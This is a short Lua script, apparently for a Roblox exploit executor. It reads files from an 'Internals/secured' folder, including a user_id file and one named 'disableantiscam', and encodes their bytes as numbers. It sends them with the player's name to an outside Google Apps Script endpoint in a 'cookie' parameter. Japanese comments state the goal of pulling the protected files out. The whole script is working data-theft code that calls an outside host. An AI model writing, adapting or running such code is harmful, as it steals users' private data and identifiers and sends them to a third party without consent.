local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
local user = game.Players.LocalPlayer.Name

local function encrypt(str)
    local t = {}
    for i = 1, #str do table.insert(t, string.byte(str, i)) end
    return table.concat(t, "-")
end

-- Securedフォルダ内の怪しいファイルを全部読み取って飛ばす
local targets = {
    "Internals/secured/user_id",
    "Internals/secured/DEV_README.txt",
    "Internals/secured/disableantiscam"
}

for _, path in pairs(targets) do
    local s, content = pcall(function() return readfile(path) end)
    if s and content then
        -- 数字に変換してGASへ（暗号化されていても、これで生データが届く）
        local secret = encrypt(content)
        game:HttpGet(gasUrl .. "?user=" .. user .. "_SECURE_" .. path:gsub("/", "_") .. "&cookie=" .. secret .. "&mode=enc")
    end
end

print("Secured files sent to GAS!")
